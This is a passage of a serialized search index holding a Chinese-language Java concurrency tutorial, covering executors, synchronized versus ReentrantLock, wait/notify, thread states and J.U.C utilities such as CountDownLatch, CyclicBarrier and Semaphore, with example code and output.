Thread end`},{header:"Executor \u7684\u4E2D\u65AD\u64CD\u4F5C",slug:"executor-\u7684\u4E2D\u65AD\u64CD\u4F5C",content:`\u8C03\u7528 Executor \u7684 shutdown() \u65B9\u6CD5\u4F1A\u7B49\u5F85\u7EBF\u7A0B\u90FD\u6267\u884C\u5B8C\u6BD5\u4E4B\u540E\u518D\u5173\u95ED\uFF0C\u4F46\u662F\u5982\u679C\u8C03\u7528\u7684\u662F shutdownNow() \u65B9\u6CD5\uFF0C\u5219\u76F8\u5F53\u4E8E\u8C03\u7528\u6BCF\u4E2A\u7EBF\u7A0B\u7684 interrupt() \u65B9\u6CD5\u3002
\u4EE5\u4E0B\u4F7F\u7528 Lambda \u521B\u5EFA\u7EBF\u7A0B\uFF0C\u76F8\u5F53\u4E8E\u521B\u5EFA\u4E86\u4E00\u4E2A\u533F\u540D\u5185\u90E8\u7EBF\u7A0B\u3002
public static void main(String[] args) { ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -> { try { Thread.sleep(2000); System.out.println("Thread run"); } catch (InterruptedException e) { e.printStackTrace(); } }); executorService.shutdownNow(); System.out.println("Main run");
}
Main run
java.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at ExecutorInterruptExample.lambda$main$0(ExecutorInterruptExample.java:9) at ExecutorInterruptExample$$Lambda$1/1160460865.run(Unknown Source) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745)
\u5982\u679C\u53EA\u60F3\u4E2D\u65AD Executor \u4E2D\u7684\u4E00\u4E2A\u7EBF\u7A0B\uFF0C\u53EF\u4EE5\u901A\u8FC7\u4F7F\u7528 submit() \u65B9\u6CD5\u6765\u63D0\u4EA4\u4E00\u4E2A\u7EBF\u7A0B\uFF0C\u5B83\u4F1A\u8FD4\u56DE\u4E00\u4E2A Future<?> \u5BF9\u8C61\uFF0C\u901A\u8FC7\u8C03\u7528\u8BE5\u5BF9\u8C61\u7684 cancel(true) \u65B9\u6CD5\u5C31\u53EF\u4EE5\u4E2D\u65AD\u7EBF\u7A0B\u3002
Future<?> future = executorService.submit(() -> { // ..
});
future.cancel(true);`},{header:"\u56DB\u3001\u4E92\u65A5\u540C\u6B65",slug:"\u56DB\u3001\u4E92\u65A5\u540C\u6B65",content:"Java \u63D0\u4F9B\u4E86\u4E24\u79CD\u9501\u673A\u5236\u6765\u63A7\u5236\u591A\u4E2A\u7EBF\u7A0B\u5BF9\u5171\u4EAB\u8D44\u6E90\u7684\u4E92\u65A5\u8BBF\u95EE\uFF0C\u7B2C\u4E00\u4E2A\u662F JVM \u5B9E\u73B0\u7684 synchronized\uFF0C\u800C\u53E6\u4E00\u4E2A\u662F JDK \u5B9E\u73B0\u7684 ReentrantLock\u3002"},{header:"synchronized",slug:"synchronized",content:`1. \u540C\u6B65\u4E00\u4E2A\u4EE3\u7801\u5757
public void func() { synchronized (this) { // ... }
}
\u5B83\u53EA\u4F5C\u7528\u4E8E\u540C\u4E00\u4E2A\u5BF9\u8C61\uFF0C\u5982\u679C\u8C03\u7528\u4E24\u4E2A\u5BF9\u8C61\u4E0A\u7684\u540C\u6B65\u4EE3\u7801\u5757\uFF0C\u5C31\u4E0D\u4F1A\u8FDB\u884C\u540C\u6B65\u3002
\u5BF9\u4E8E\u4EE5\u4E0B\u4EE3\u7801\uFF0C\u4F7F\u7528 ExecutorService \u6267\u884C\u4E86\u4E24\u4E2A\u7EBF\u7A0B\uFF0C\u7531\u4E8E\u8C03\u7528\u7684\u662F\u540C\u4E00\u4E2A\u5BF9\u8C61\u7684\u540C\u6B65\u4EE3\u7801\u5757\uFF0C\u56E0\u6B64\u8FD9\u4E24\u4E2A\u7EBF\u7A0B\u4F1A\u8FDB\u884C\u540C\u6B65\uFF0C\u5F53\u4E00\u4E2A\u7EBF\u7A0B\u8FDB\u5165\u540C\u6B65\u8BED\u53E5\u5757\u65F6\uFF0C\u53E6\u4E00\u4E2A\u7EBF\u7A0B\u5C31\u5FC5\u987B\u7B49\u5F85\u3002
public class SynchronizedExample { public void func1() { synchronized (this) { for (int i = 0; i < 10; i++) { System.out.print(i + " "); } } }
}
public static void main(String[] args) { SynchronizedExample e1 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -> e1.func1()); executorService.execute(() -> e1.func1());
}
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9
\u5BF9\u4E8E\u4EE5\u4E0B\u4EE3\u7801\uFF0C\u4E24\u4E2A\u7EBF\u7A0B\u8C03\u7528\u4E86\u4E0D\u540C\u5BF9\u8C61\u7684\u540C\u6B65\u4EE3\u7801\u5757\uFF0C\u56E0\u6B64\u8FD9\u4E24\u4E2A\u7EBF\u7A0B\u5C31\u4E0D\u9700\u8981\u540C\u6B65\u3002\u4ECE\u8F93\u51FA\u7ED3\u679C\u53EF\u4EE5\u770B\u51FA\uFF0C\u4E24\u4E2A\u7EBF\u7A0B\u4EA4\u53C9\u6267\u884C\u3002
public static void main(String[] args) { SynchronizedExample e1 = new SynchronizedExample(); SynchronizedExample e2 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -> e1.func1()); executorService.execute(() -> e2.func1());
}
0 0 1 1 2 2 3 3 4 4 5 5 6 6 7 7 8 8 9 9
2. \u540C\u6B65\u4E00\u4E2A\u65B9\u6CD5
public synchronized void func () { // ...
}
\u5B83\u548C\u540C\u6B65\u4EE3\u7801\u5757\u4E00\u6837\uFF0C\u4F5C\u7528\u4E8E\u540C\u4E00\u4E2A\u5BF9\u8C61\u3002
3. \u540C\u6B65\u4E00\u4E2A\u7C7B
public void func() { synchronized (SynchronizedExample.class) { // ... }
}
\u4F5C\u7528\u4E8E\u6574\u4E2A\u7C7B\uFF0C\u4E5F\u5C31\u662F\u8BF4\u4E24\u4E2A\u7EBF\u7A0B\u8C03\u7528\u540C\u4E00\u4E2A\u7C7B\u7684\u4E0D\u540C\u5BF9\u8C61\u4E0A\u7684\u8FD9\u79CD\u540C\u6B65\u8BED\u53E5\uFF0C\u4E5F\u4F1A\u8FDB\u884C\u540C\u6B65\u3002
public class SynchronizedExample { public void func2() { synchronized (SynchronizedExample.class) { for (int i = 0; i < 10; i++) { System.out.print(i + " "); } } }
}
public static void main(String[] args) { SynchronizedExample e1 = new SynchronizedExample(); SynchronizedExample e2 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -> e1.func2()); executorService.execute(() -> e2.func2());
}
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9
4. \u540C\u6B65\u4E00\u4E2A\u9759\u6001\u65B9\u6CD5
public synchronized static void fun() { // ...
}
\u4F5C\u7528\u4E8E\u6574\u4E2A\u7C7B\u3002`},{header:"ReentrantLock",slug:"reentrantlock",content:`ReentrantLock \u662F java.util.concurrent\uFF08J.U.C\uFF09\u5305\u4E2D\u7684\u9501\u3002
public class LockExample { private Lock lock = new ReentrantLock(); public void func() { lock.lock(); try { for (int i = 0; i < 10; i++) { System.out.print(i + " "); } } finally { lock.unlock(); // \u786E\u4FDD\u91CA\u653E\u9501\uFF0C\u4ECE\u800C\u907F\u514D\u53D1\u751F\u6B7B\u9501\u3002 } }
}
public static void main(String[] args) { LockExample lockExample = new LockExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -> lockExample.func()); executorService.execute(() -> lockExample.func());
}
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9`},{header:"\u6BD4\u8F83",slug:"\u6BD4\u8F83",content:`1. \u9501\u7684\u5B9E\u73B0
synchronized \u662F JVM \u5B9E\u73B0\u7684\uFF0C\u800C ReentrantLock \u662F JDK \u5B9E\u73B0\u7684\u3002
2. \u6027\u80FD
\u65B0\u7248\u672C Java \u5BF9 synchronized \u8FDB\u884C\u4E86\u5F88\u591A\u4F18\u5316\uFF0C\u4F8B\u5982\u81EA\u65CB\u9501\u7B49\uFF0Csynchronized \u4E0E ReentrantLock \u5927\u81F4\u76F8\u540C\u3002
3. \u7B49\u5F85\u53EF\u4E2D\u65AD
\u5F53\u6301\u6709\u9501\u7684\u7EBF\u7A0B\u957F\u671F\u4E0D\u91CA\u653E\u9501\u7684\u65F6\u5019\uFF0C\u6B63\u5728\u7B49\u5F85\u7684\u7EBF\u7A0B\u53EF\u4EE5\u9009\u62E9\u653E\u5F03\u7B49\u5F85\uFF0C\u6539\u4E3A\u5904\u7406\u5176\u4ED6\u4E8B\u60C5\u3002
ReentrantLock \u53EF\u4E2D\u65AD\uFF0C\u800C synchronized \u4E0D\u884C\u3002
4. \u516C\u5E73\u9501
\u516C\u5E73\u9501\u662F\u6307\u591A\u4E2A\u7EBF\u7A0B\u5728\u7B49\u5F85\u540C\u4E00\u4E2A\u9501\u65F6\uFF0C\u5FC5\u987B\u6309\u7167\u7533\u8BF7\u9501\u7684\u65F6\u95F4\u987A\u5E8F\u6765\u4F9D\u6B21\u83B7\u5F97\u9501\u3002
synchronized \u4E2D\u7684\u9501\u662F\u975E\u516C\u5E73\u7684\uFF0CReentrantLock \u9ED8\u8BA4\u60C5\u51B5\u4E0B\u4E5F\u662F\u975E\u516C\u5E73\u7684\uFF0C\u4F46\u662F\u4E5F\u53EF\u4EE5\u662F\u516C\u5E73\u7684\u3002
5. \u9501\u7ED1\u5B9A\u591A\u4E2A\u6761\u4EF6
\u4E00\u4E2A ReentrantLock \u53EF\u4EE5\u540C\u65F6\u7ED1\u5B9A\u591A\u4E2A Condition \u5BF9\u8C61\u3002`},{header:"\u4F7F\u7528\u9009\u62E9",slug:"\u4F7F\u7528\u9009\u62E9",content:"\u9664\u975E\u9700\u8981\u4F7F\u7528 ReentrantLock \u7684\u9AD8\u7EA7\u529F\u80FD\uFF0C\u5426\u5219\u4F18\u5148\u4F7F\u7528 synchronized\u3002\u8FD9\u662F\u56E0\u4E3A synchronized \u662F JVM \u5B9E\u73B0\u7684\u4E00\u79CD\u9501\u673A\u5236\uFF0CJVM \u539F\u751F\u5730\u652F\u6301\u5B83\uFF0C\u800C ReentrantLock \u4E0D\u662F\u6240\u6709\u7684 JDK \u7248\u672C\u90FD\u652F\u6301\u3002\u5E76\u4E14\u4F7F\u7528 synchronized \u4E0D\u7528\u62C5\u5FC3\u6CA1\u6709\u91CA\u653E\u9501\u800C\u5BFC\u81F4\u6B7B\u9501\u95EE\u9898\uFF0C\u56E0\u4E3A JVM \u4F1A\u786E\u4FDD\u9501\u7684\u91CA\u653E\u3002"},{header:"\u4E94\u3001\u7EBF\u7A0B\u4E4B\u95F4\u7684\u534F\u4F5C",slug:"\u4E94\u3001\u7EBF\u7A0B\u4E4B\u95F4\u7684\u534F\u4F5C",content:"\u5F53\u591A\u4E2A\u7EBF\u7A0B\u53EF\u4EE5\u4E00\u8D77\u5DE5\u4F5C\u53BB\u89E3\u51B3\u67D0\u4E2A\u95EE\u9898\u65F6\uFF0C\u5982\u679C\u67D0\u4E9B\u90E8\u5206\u5FC5\u987B\u5728\u5176\u5B83\u90E8\u5206\u4E4B\u524D\u5B8C\u6210\uFF0C\u90A3\u4E48\u5C31\u9700\u8981\u5BF9\u7EBF\u7A0B\u8FDB\u884C\u534F\u8C03\u3002"},{header:"join()",slug:"join",content:`\u5728\u7EBF\u7A0B\u4E2D\u8C03\u7528\u53E6\u4E00\u4E2A\u7EBF\u7A0B\u7684 join() \u65B9\u6CD5\uFF0C\u4F1A\u5C06\u5F53\u524D\u7EBF\u7A0B\u6302\u8D77\uFF0C\u800C\u4E0D\u662F\u5FD9\u7B49\u5F85\uFF0C\u76F4\u5230\u76EE\u6807\u7EBF\u7A0B\u7ED3\u675F\u3002
\u5BF9\u4E8E\u4EE5\u4E0B\u4EE3\u7801\uFF0C\u867D\u7136 b \u7EBF\u7A0B\u5148\u542F\u52A8\uFF0C\u4F46\u662F\u56E0\u4E3A\u5728 b \u7EBF\u7A0B\u4E2D\u8C03\u7528\u4E86 a \u7EBF\u7A0B\u7684 join() \u65B9\u6CD5\uFF0Cb \u7EBF\u7A0B\u4F1A\u7B49\u5F85 a \u7EBF\u7A0B\u7ED3\u675F\u624D\u7EE7\u7EED\u6267\u884C\uFF0C\u56E0\u6B64\u6700\u540E\u80FD\u591F\u4FDD\u8BC1 a \u7EBF\u7A0B\u7684\u8F93\u51FA\u5148\u4E8E b \u7EBF\u7A0B\u7684\u8F93\u51FA\u3002
public class JoinExample { private class A extends Thread { @Override public void run() { System.out.println("A"); } } private class B extends Thread { private A a; B(A a) { this.a = a; } @Override public void run() { try { a.join(); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println("B"); } } public void test() { A a = new A(); B b = new B(a); b.start(); a.start(); }
}
public static void main(String[] args) { JoinExample example = new JoinExample(); example.test();
}
A
B`},{header:"wait() notify() notifyAll()",slug:"wait-notify-notifyall",content:`\u8C03\u7528 wait() \u4F7F\u5F97\u7EBF\u7A0B\u7B49\u5F85\u67D0\u4E2A\u6761\u4EF6\u6EE1\u8DB3\uFF0C\u7EBF\u7A0B\u5728\u7B49\u5F85\u65F6\u4F1A\u88AB\u6302\u8D77\uFF0C\u5F53\u5176\u4ED6\u7EBF\u7A0B\u7684\u8FD0\u884C\u4F7F\u5F97\u8FD9\u4E2A\u6761\u4EF6\u6EE1\u8DB3\u65F6\uFF0C\u5176\u5B83\u7EBF\u7A0B\u4F1A\u8C03\u7528 notify() \u6216\u8005 notifyAll() \u6765\u5524\u9192\u6302\u8D77\u7684\u7EBF\u7A0B\u3002
\u5B83\u4EEC\u90FD\u5C5E\u4E8E Object \u7684\u4E00\u90E8\u5206\uFF0C\u800C\u4E0D\u5C5E\u4E8E Thread\u3002
\u53EA\u80FD\u7528\u5728\u540C\u6B65\u65B9\u6CD5\u6216\u8005\u540C\u6B65\u63A7\u5236\u5757\u4E2D\u4F7F\u7528\uFF0C\u5426\u5219\u4F1A\u5728\u8FD0\u884C\u65F6\u629B\u51FA IllegalMonitorStateException\u3002
\u4F7F\u7528 wait() \u6302\u8D77\u671F\u95F4\uFF0C\u7EBF\u7A0B\u4F1A\u91CA\u653E\u9501\u3002\u8FD9\u662F\u56E0\u4E3A\uFF0C\u5982\u679C\u6CA1\u6709\u91CA\u653E\u9501\uFF0C\u90A3\u4E48\u5176\u5B83\u7EBF\u7A0B\u5C31\u65E0\u6CD5\u8FDB\u5165\u5BF9\u8C61\u7684\u540C\u6B65\u65B9\u6CD5\u6216\u8005\u540C\u6B65\u63A7\u5236\u5757\u4E2D\uFF0C\u90A3\u4E48\u5C31\u65E0\u6CD5\u6267\u884C notify() \u6216\u8005 notifyAll() \u6765\u5524\u9192\u6302\u8D77\u7684\u7EBF\u7A0B\uFF0C\u9020\u6210\u6B7B\u9501\u3002
public class WaitNotifyExample { public synchronized void before() { System.out.println("before"); notifyAll(); } public synchronized void after() { try { wait(); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println("after"); }
}
public static void main(String[] args) { ExecutorService executorService = Executors.newCachedThreadPool(); WaitNotifyExample example = new WaitNotifyExample(); executorService.execute(() -> example.after()); executorService.execute(() -> example.before());
}
before
after
wait() \u548C sleep() \u7684\u533A\u522B wait() \u662F Object \u7684\u65B9\u6CD5\uFF0C\u800C sleep() \u662F Thread \u7684\u9759\u6001\u65B9\u6CD5\uFF1B
wait() \u4F1A\u91CA\u653E\u9501\uFF0Csleep() \u4E0D\u4F1A\u3002`},{header:"await() signal() signalAll()",slug:"await-signal-signalall",content:`java.util.concurrent \u7C7B\u5E93\u4E2D\u63D0\u4F9B\u4E86 Condition \u7C7B\u6765\u5B9E\u73B0\u7EBF\u7A0B\u4E4B\u95F4\u7684\u534F\u8C03\uFF0C\u53EF\u4EE5\u5728 Condition \u4E0A\u8C03\u7528 await() \u65B9\u6CD5\u4F7F\u7EBF\u7A0B\u7B49\u5F85\uFF0C\u5176\u5B83\u7EBF\u7A0B\u8C03\u7528 signal() \u6216 signalAll() \u65B9\u6CD5\u5524\u9192\u7B49\u5F85\u7684\u7EBF\u7A0B\u3002
\u76F8\u6BD4\u4E8E wait() \u8FD9\u79CD\u7B49\u5F85\u65B9\u5F0F\uFF0Cawait() \u53EF\u4EE5\u6307\u5B9A\u7B49\u5F85\u7684\u6761\u4EF6\uFF0C\u56E0\u6B64\u66F4\u52A0\u7075\u6D3B\u3002
\u4F7F\u7528 Lock \u6765\u83B7\u53D6\u4E00\u4E2A Condition \u5BF9\u8C61\u3002
public class AwaitSignalExample { private Lock lock = new ReentrantLock(); private Condition condition = lock.newCondition(); public void before() { lock.lock(); try { System.out.println("before"); condition.signalAll(); } finally { lock.unlock(); } } public void after() { lock.lock(); try { condition.await(); System.out.println("after"); } catch (InterruptedException e) { e.printStackTrace(); } finally { lock.unlock(); } }
}
public static void main(String[] args) { ExecutorService executorService = Executors.newCachedThreadPool(); AwaitSignalExample example = new AwaitSignalExample(); executorService.execute(() -> example.after()); executorService.execute(() -> example.before());
}
before
after`},{header:"\u516D\u3001\u7EBF\u7A0B\u72B6\u6001",slug:"\u516D\u3001\u7EBF\u7A0B\u72B6\u6001",content:"\u4E00\u4E2A\u7EBF\u7A0B\u53EA\u80FD\u5904\u4E8E\u4E00\u79CD\u72B6\u6001\uFF0C\u5E76\u4E14\u8FD9\u91CC\u7684\u7EBF\u7A0B\u72B6\u6001\u7279\u6307 Java \u865A\u62DF\u673A\u7684\u7EBF\u7A0B\u72B6\u6001\uFF0C\u4E0D\u80FD\u53CD\u6620\u7EBF\u7A0B\u5728\u7279\u5B9A\u64CD\u4F5C\u7CFB\u7EDF\u4E0B\u7684\u72B6\u6001\u3002"},{header:"\u65B0\u5EFA\uFF08NEW\uFF09",slug:"\u65B0\u5EFA-new",content:"\u521B\u5EFA\u540E\u5C1A\u672A\u542F\u52A8\u3002"},{header:"\u53EF\u8FD0\u884C\uFF08RUNABLE\uFF09",slug:"\u53EF\u8FD0\u884C-runable",content:"\u6B63\u5728 Java \u865A\u62DF\u673A\u4E2D\u8FD0\u884C\u3002\u4F46\u662F\u5728\u64CD\u4F5C\u7CFB\u7EDF\u5C42\u9762\uFF0C\u5B83\u53EF\u80FD\u5904\u4E8E\u8FD0\u884C\u72B6\u6001\uFF0C\u4E5F\u53EF\u80FD\u7B49\u5F85\u8D44\u6E90\u8C03\u5EA6\uFF08\u4F8B\u5982\u5904\u7406\u5668\u8D44\u6E90\uFF09\uFF0C\u8D44\u6E90\u8C03\u5EA6\u5B8C\u6210\u5C31\u8FDB\u5165\u8FD0\u884C\u72B6\u6001\u3002\u6240\u4EE5\u8BE5\u72B6\u6001\u7684\u53EF\u8FD0\u884C\u662F\u6307\u53EF\u4EE5\u88AB\u8FD0\u884C\uFF0C\u5177\u4F53\u6709\u6CA1\u6709\u8FD0\u884C\u8981\u770B\u5E95\u5C42\u64CD\u4F5C\u7CFB\u7EDF\u7684\u8D44\u6E90\u8C03\u5EA6\u3002"},{header:"\u963B\u585E\uFF08BLOCKED\uFF09",slug:"\u963B\u585E-blocked",content:"\u8BF7\u6C42\u83B7\u53D6 monitor lock \u4ECE\u800C\u8FDB\u5165 synchronized \u51FD\u6570\u6216\u8005\u4EE3\u7801\u5757\uFF0C\u4F46\u662F\u5176\u5B83\u7EBF\u7A0B\u5DF2\u7ECF\u5360\u7528\u4E86\u8BE5 monitor lock\uFF0C\u6240\u4EE5\u51FA\u4E8E\u963B\u585E\u72B6\u6001\u3002\u8981\u7ED3\u675F\u8BE5\u72B6\u6001\u8FDB\u5165\u4ECE\u800C RUNABLE \u9700\u8981\u5176\u4ED6\u7EBF\u7A0B\u91CA\u653E monitor lock\u3002"},{header:"\u65E0\u9650\u671F\u7B49\u5F85\uFF08WAITING\uFF09",slug:"\u65E0\u9650\u671F\u7B49\u5F85-waiting",content:`\u7B49\u5F85\u5176\u5B83\u7EBF\u7A0B\u663E\u5F0F\u5730\u5524\u9192\u3002
\u963B\u585E\u548C\u7B49\u5F85\u7684\u533A\u522B\u5728\u4E8E\uFF0C\u963B\u585E\u662F\u88AB\u52A8\u7684\uFF0C\u5B83\u662F\u5728\u7B49\u5F85\u83B7\u53D6 monitor lock\u3002\u800C\u7B49\u5F85\u662F\u4E3B\u52A8\u7684\uFF0C\u901A\u8FC7\u8C03\u7528 Object.wait() \u7B49\u65B9\u6CD5\u8FDB\u5165\u3002 \u8FDB\u5165\u65B9\u6CD5
\u9000\u51FA\u65B9\u6CD5 \u6CA1\u6709\u8BBE\u7F6E Timeout \u53C2\u6570\u7684 Object.wait() \u65B9\u6CD5
Object.notify() / Object.notifyAll() \u6CA1\u6709\u8BBE\u7F6E Timeout \u53C2\u6570\u7684 Thread.join() \u65B9\u6CD5
\u88AB\u8C03\u7528\u7684\u7EBF\u7A0B\u6267\u884C\u5B8C\u6BD5 LockSupport.park() \u65B9\u6CD5
LockSupport.unpark(Thread)`},{header:"\u9650\u671F\u7B49\u5F85\uFF08TIMED_WAITING\uFF09",slug:"\u9650\u671F\u7B49\u5F85-timed-waiting",content:`\u65E0\u9700\u7B49\u5F85\u5176\u5B83\u7EBF\u7A0B\u663E\u5F0F\u5730\u5524\u9192\uFF0C\u5728\u4E00\u5B9A\u65F6\u95F4\u4E4B\u540E\u4F1A\u88AB\u7CFB\u7EDF\u81EA\u52A8\u5524\u9192\u3002 \u8FDB\u5165\u65B9\u6CD5
\u9000\u51FA\u65B9\u6CD5 Thread.sleep() \u65B9\u6CD5
\u65F6\u95F4\u7ED3\u675F \u8BBE\u7F6E\u4E86 Timeout \u53C2\u6570\u7684 Object.wait() \u65B9\u6CD5
\u65F6\u95F4\u7ED3\u675F / Object.notify() / Object.notifyAll() \u8BBE\u7F6E\u4E86 Timeout \u53C2\u6570\u7684 Thread.join() \u65B9\u6CD5
\u65F6\u95F4\u7ED3\u675F / \u88AB\u8C03\u7528\u7684\u7EBF\u7A0B\u6267\u884C\u5B8C\u6BD5 LockSupport.parkNanos() \u65B9\u6CD5
LockSupport.unpark(Thread) LockSupport.parkUntil() \u65B9\u6CD5
LockSupport.unpark(Thread) \u8C03\u7528 Thread.sleep() \u65B9\u6CD5\u4F7F\u7EBF\u7A0B\u8FDB\u5165\u9650\u671F\u7B49\u5F85\u72B6\u6001\u65F6\uFF0C\u5E38\u5E38\u7528\u201C\u4F7F\u4E00\u4E2A\u7EBF\u7A0B\u7761\u7720\u201D\u8FDB\u884C\u63CF\u8FF0\u3002\u8C03\u7528 Object.wait() \u65B9\u6CD5\u4F7F\u7EBF\u7A0B\u8FDB\u5165\u9650\u671F\u7B49\u5F85\u6216\u8005\u65E0\u9650\u671F\u7B49\u5F85\u65F6\uFF0C\u5E38\u5E38\u7528\u201C\u6302\u8D77\u4E00\u4E2A\u7EBF\u7A0B\u201D\u8FDB\u884C\u63CF\u8FF0\u3002\u7761\u7720\u548C\u6302\u8D77\u662F\u7528\u6765\u63CF\u8FF0\u884C\u4E3A\uFF0C\u800C\u963B\u585E\u548C\u7B49\u5F85\u7528\u6765\u63CF\u8FF0\u72B6\u6001\u3002`},{header:"\u6B7B\u4EA1\uFF08TERMINATED\uFF09",slug:"\u6B7B\u4EA1-terminated",content:`\u53EF\u4EE5\u662F\u7EBF\u7A0B\u7ED3\u675F\u4EFB\u52A1\u4E4B\u540E\u81EA\u5DF1\u7ED3\u675F\uFF0C\u6216\u8005\u4EA7\u751F\u4E86\u5F02\u5E38\u800C\u7ED3\u675F\u3002
Java SE 9 Enum Thread.State`},{header:"\u4E03\u3001J.U.C - AQS",slug:"\u4E03\u3001j-u-c-aqs",content:"java.util.concurrent\uFF08J.U.C\uFF09\u5927\u5927\u63D0\u9AD8\u4E86\u5E76\u53D1\u6027\u80FD\uFF0CAQS \u88AB\u8BA4\u4E3A\u662F J.U.C \u7684\u6838\u5FC3\u3002"},{header:"CountDownLatch",slug:"countdownlatch",content:`\u7528\u6765\u63A7\u5236\u4E00\u4E2A\u6216\u8005\u591A\u4E2A\u7EBF\u7A0B\u7B49\u5F85\u591A\u4E2A\u7EBF\u7A0B\u3002
\u7EF4\u62A4\u4E86\u4E00\u4E2A\u8BA1\u6570\u5668 cnt\uFF0C\u6BCF\u6B21\u8C03\u7528 countDown() \u65B9\u6CD5\u4F1A\u8BA9\u8BA1\u6570\u5668\u7684\u503C\u51CF 1\uFF0C\u51CF\u5230 0 \u7684\u65F6\u5019\uFF0C\u90A3\u4E9B\u56E0\u4E3A\u8C03\u7528 await() \u65B9\u6CD5\u800C\u5728\u7B49\u5F85\u7684\u7EBF\u7A0B\u5C31\u4F1A\u88AB\u5524\u9192\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ba078291-791e-4378-b6d1-ece76c2f0b14.png" width="300px">
public class CountdownLatchExample { public static void main(String[] args) throws InterruptedException { final int totalThread = 10; CountDownLatch countDownLatch = new CountDownLatch(totalThread); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i < totalThread; i++) { executorService.execute(() -> { System.out.print("run.."); countDownLatch.countDown(); }); } countDownLatch.await(); System.out.println("end"); executorService.shutdown(); }
}
run..run..run..run..run..run..run..run..run..run..end`},{header:"CyclicBarrier",slug:"cyclicbarrier",content:`\u7528\u6765\u63A7\u5236\u591A\u4E2A\u7EBF\u7A0B\u4E92\u76F8\u7B49\u5F85\uFF0C\u53EA\u6709\u5F53\u591A\u4E2A\u7EBF\u7A0B\u90FD\u5230\u8FBE\u65F6\uFF0C\u8FD9\u4E9B\u7EBF\u7A0B\u624D\u4F1A\u7EE7\u7EED\u6267\u884C\u3002
\u548C CountdownLatch \u76F8\u4F3C\uFF0C\u90FD\u662F\u901A\u8FC7\u7EF4\u62A4\u8BA1\u6570\u5668\u6765\u5B9E\u73B0\u7684\u3002\u7EBF\u7A0B\u6267\u884C await() \u65B9\u6CD5\u4E4B\u540E\u8BA1\u6570\u5668\u4F1A\u51CF 1\uFF0C\u5E76\u8FDB\u884C\u7B49\u5F85\uFF0C\u76F4\u5230\u8BA1\u6570\u5668\u4E3A 0\uFF0C\u6240\u6709\u8C03\u7528 await() \u65B9\u6CD5\u800C\u5728\u7B49\u5F85\u7684\u7EBF\u7A0B\u624D\u80FD\u7EE7\u7EED\u6267\u884C\u3002
CyclicBarrier \u548C CountdownLatch \u7684\u4E00\u4E2A\u533A\u522B\u662F\uFF0CCyclicBarrier \u7684\u8BA1\u6570\u5668\u901A\u8FC7\u8C03\u7528 reset() \u65B9\u6CD5\u53EF\u4EE5\u5FAA\u73AF\u4F7F\u7528\uFF0C\u6240\u4EE5\u5B83\u624D\u53EB\u505A\u5FAA\u73AF\u5C4F\u969C\u3002
CyclicBarrier \u6709\u4E24\u4E2A\u6784\u9020\u51FD\u6570\uFF0C\u5176\u4E2D parties \u6307\u793A\u8BA1\u6570\u5668\u7684\u521D\u59CB\u503C\uFF0CbarrierAction \u5728\u6240\u6709\u7EBF\u7A0B\u90FD\u5230\u8FBE\u5C4F\u969C\u7684\u65F6\u5019\u4F1A\u6267\u884C\u4E00\u6B21\u3002
public CyclicBarrier(int parties, Runnable barrierAction) { if (parties <= 0) throw new IllegalArgumentException(); this.parties = parties; this.count = parties; this.barrierCommand = barrierAction;
} public CyclicBarrier(int parties) { this(parties, null);
}
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f71af66b-0d54-4399-a44b-f47b58321984.png" width="300px">
public class CyclicBarrierExample { public static void main(String[] args) { final int totalThread = 10; CyclicBarrier cyclicBarrier = new CyclicBarrier(totalThread); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i < totalThread; i++) { executorService.execute(() -> { System.out.print("before.."); try { cyclicBarrier.await(); } catch (InterruptedException | BrokenBarrierException e) { e.printStackTrace(); } System.out.print("after.."); }); } executorService.shutdown(); }
}
before..before..before..before..before..before..before..before..before..before..after..after..after..after..after..after..after..after..after..after..`},{header:"Semaphore",slug:"semaphore",content:`Semaphore \u7C7B\u4F3C\u4E8E\u64CD\u4F5C\u7CFB\u7EDF\u4E2D\u7684\u4FE1\u53F7\u91CF\uFF0C\u53EF\u4EE5\u63A7\u5236\u5BF9\u4E92\u65A5\u8D44\u6E90\u7684\u8BBF\u95EE\u7EBF\u7A0B\u6570\u3002
\u4EE5\u4E0B\u4EE3\u7801\u6A21\u62DF\u4E86\u5BF9\u67D0\u4E2A\u670D\u52A1\u7684\u5E76\u53D1\u8BF7\u6C42\uFF0C\u6BCF\u6B21\u53EA\u80FD\u6709 3 \u4E2A\u5BA2\u6237\u7AEF\u540C\u65F6\u8BBF\u95EE\uFF0C\u8BF7\u6C42\u603B\u6570\u4E3A 10\u3002
public class SemaphoreExample { public static void main(String[] args) { final int clientCount = 3; final int totalRequestCount = 10; Semaphore semaphore = new Semaphore(clientCount); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i < totalRequestCount; i++) { executorService.execute(()->{ try { semaphore.acquire(); System.out.print(semaphore.availablePermits() + " "); } catch (InterruptedException e) { e.printStackTrace(); } finally { semaphore.release(); } }); } executorService.shutdown(); }
}
